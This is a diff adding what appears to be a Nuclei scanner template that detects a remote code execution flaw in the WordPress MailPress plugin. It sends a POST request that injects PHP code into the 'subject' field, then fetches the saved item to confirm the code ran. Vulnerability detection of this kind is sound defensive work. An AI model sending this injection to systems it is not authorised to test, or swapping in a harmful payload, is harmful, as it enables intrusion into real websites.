@@ -1,0 +1,44 @@
+id: wordpress-ext-mailpress-rce
+info:
+  name: Wordpress Ext Mailpress Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce,wordpress,plugin
+  description: |
+    Wordpress Ext Mailpress is vulnerable to remote code execution via crafted requests.
+http:
+  - raw:
+      - |
+        POST /wp-content/plugins/mailpress/mp-includes/action.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php echo {{r}}+{{r1}};?>&html=&plaintext=&mail_format=standard&autosave=1
+    stop-at-first-match: true
+    extractors:
+      - type: regex
+        name: id
+        internal: true
+        group: 1
+        regex:
+          - "<autosave id='(.+?)'"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<autosave id="
+  - raw:
+      - |
+        GET /wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id={{id}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(body, to_string(to_number(r) + to_number(r1)))
+variables:
+  r: "{{rand_int(10000, 21000)}}"
+  r1: "{{rand_int(10000, 21000)}}"
